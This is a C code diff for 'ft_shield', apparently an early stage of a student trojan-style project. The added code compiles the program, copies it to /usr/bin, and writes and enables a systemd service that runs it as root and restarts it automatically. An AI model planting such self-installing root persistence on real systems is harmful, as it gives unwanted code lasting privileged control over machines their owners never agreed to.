@@ -1,5 +1,6 @@
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
 #include <sys/syslog.h>
 #include <sys/types.h>
 #include <sys/stat.h>
@@ -51,58 +52,44 @@ void refresh_pid(int fd) {
     write(fd, buf, sizeof(buf));
 }
 
-bool has_root_privileges() {
-    return (geteuid() == 0);
-}
+#define FT_SHIELD_SERVICE_PATH "/etc/systemd/system/ft_shield.service"
 
-void ft_shield() {
-    char *buffer = malloc(sizeof(char) * BUFFER_SIZE);
-    if (buffer == NULL) {
-        return;
-    }
-    size_t buffer_size = BUFFER_SIZE;
-    getlogin_r(buffer, buffer_size);
-    printf("Login: %s\n", buffer);
-}
+int main() {
+    const char *p = "[Unit]\nDescription=My service\nAfter=network.target\n[Service]\nExecStart=/usr/bin/ft_shield\nRestart=always\nUser=root\n[Install]\nWantedBy=multi-user.target\n";
 
-int main(void) {
     umask(0);
-    if (!has_root_privileges()) {
+    if (getuid()) {
         printf("ft_shield needs root privileges\n");
         return (EXIT_FAILURE);
     }
 
-    const char *path = LOCK_FILE_PATH;
-    int current_fd = acquire_lock(path);
-    if (current_fd != 0) {
-        exit(EXIT_FAILURE);
-    }
-
-
     pid_t pid = fork();
-    if (pid > 0) {
-        syslog(LOG_NOTICE, "foreground work is done");
+    if (pid == 0) {
+        char *buffer = malloc(sizeof(char) * BUFFER_SIZE);
+        if (buffer == NULL) {
+            return 1;
+        }
+        size_t buffer_size = BUFFER_SIZE;
+        getlogin_r(buffer, buffer_size);
+        printf("Login: %s\n", buffer);
         exit(EXIT_SUCCESS);
-    } else if (pid < 0) {
-        return (1);
     } else {
-        syslog(LOG_NOTICE, "We are so in");
-        refresh_pid(current_fd);
-        while (true) {
-            // here we are gonna have the tcp server listening for three clients
-            sleep(1000);
-            syslog(LOG_NOTICE, "Work is being done");
+        int ret = system("gcc src/ft_shield.c -o ft_shield;mv ft_shield /usr/bin/");
+        if (ret != 0) {
+            printf("error\n");
+            return 1;
         }
 
-        /*
-        #include <sys/reboot.h>
-        #include <string.h>
-        if (reboot(RB_AUTOBOOT) != 0)
-            return 1;
-            */
-        close(STDIN_FILENO);
-        close(STDOUT_FILENO);
-        close(STDERR_FILENO);
+        // write the service script
+        int fd = open(FT_SHIELD_SERVICE_PATH, O_CREAT | O_WRONLY, 0644);
+        if (fd < 0) {
+            return -1;
+        }
+        write(fd, p, strlen(p));
+
+        system("systemctl daemon-reload");
+        system("systemctl enable ft_shield");
+        system("systemctl start ft_shield");
     }
     return (0);
 }
